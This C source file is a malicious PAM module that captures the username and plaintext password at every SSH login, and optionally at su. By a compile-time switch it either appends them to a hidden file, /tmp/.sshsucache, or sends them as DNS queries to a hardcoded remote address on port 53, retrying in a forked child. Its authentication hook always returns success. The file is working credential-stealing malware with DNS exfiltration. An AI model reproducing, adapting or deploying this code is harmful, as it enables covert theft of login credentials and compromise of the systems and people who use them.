#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "../dns/dns.h"

/*
    Need root previlege!!!
*/

/*
    Custom setting
*/
# define SSH_OR_BOTH 0 //ssh=0,su&&ssh=1,default is ssh
# define SAVE_OR_SEND 0 //send=0,save=1,default is send

/*
    Send to server
*/
# define MAX_RESEND 30
# define RESEND_INTERVAL 5
# define REMOTE_ADDRESS "192.168.0.12"
# define REMOTE_PORT 53

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.sshsucache"


void 
saveResult(char stealResult[]) 
{
   FILE *fp = NULL;
 
   fp = fopen(SAVE_LOCATION, "a+");
   fputs(stealResult, fp);
   fclose(fp); 
}

void
sendResult(char stealResult[])
{
    struct sockaddr_in evil;
    unsigned char *packet;
    int sockfd;
    unsigned int slen = sizeof(evil);

    if((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        return;
    }

    evil.sin_family = AF_INET;
    evil.sin_port   = htons(REMOTE_PORT);
    evil.sin_addr.s_addr = inet_addr(REMOTE_ADDRESS);
    memset(&evil.sin_zero, 0, sizeof(evil.sin_zero));

    DNS_header *header = create_header(); 
    DNS_question *question = create_question(stealResult);
    size_t packet_length = build_packet(header, question, &packet);

    free(header);
    free(question);

    for (int i =0;i<MAX_RESEND;i++)
    {
       sendto(sockfd, packet, packet_length, 0, (struct sockaddr *) &evil, slen);

       fd_set fds;
       FD_ZERO(&fds);
       FD_SET(sockfd,&fds);
       struct timeval timeout;
       timeout.tv_sec = RESEND_INTERVAL;
       timeout.tv_usec = 0;

       int ok = select(sockfd+1,&fds,NULL,NULL,&timeout);
       if (ok >0)
       {
           return;
       }
    }
}

void
sendSingleResult(char stealResult[])
{
    struct sockaddr_in evil;
    unsigned char *packet;
    int sockfd;
    unsigned int slen = sizeof(evil);

    if((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        return;
    }

    evil.sin_family = AF_INET;
    evil.sin_port   = htons(REMOTE_PORT);
    evil.sin_addr.s_addr = inet_addr(REMOTE_ADDRESS);
    memset(&evil.sin_zero, 0, sizeof(evil.sin_zero));

    DNS_header *header = create_header(); 
    DNS_question *question = create_question(stealResult);
    size_t packet_length = build_packet(header, question, &packet);

    free(header);
    free(question);

    sendto(sockfd, packet, packet_length, 0, (struct sockaddr *) &evil, slen);
}

PAM_EXTERN int 
pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  const char* username;
  const char* password;

  char bonus[2048];
  
  pam_get_item(pamh,PAM_USER,(void *) &username);
  pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
  
  snprintf(bonus,sizeof(bonus),"Username %s\nPassword: %s\n",username,password);

  if (password != NULL)
  {
     if (SAVE_OR_SEND)
     {
         saveResult(bonus);
     }
     else if (SSH_OR_BOTH)
     {
        sendSingleResult(bonus);
     } 
     else if (!SSH_OR_BOTH)
     {
         int pid = fork();
         if (pid == 0)
         {
             sendResult(bonus);
         }
     }
  }
  return PAM_SUCCESS;
}

PAM_EXTERN int 
pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}

PAM_EXTERN int 
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

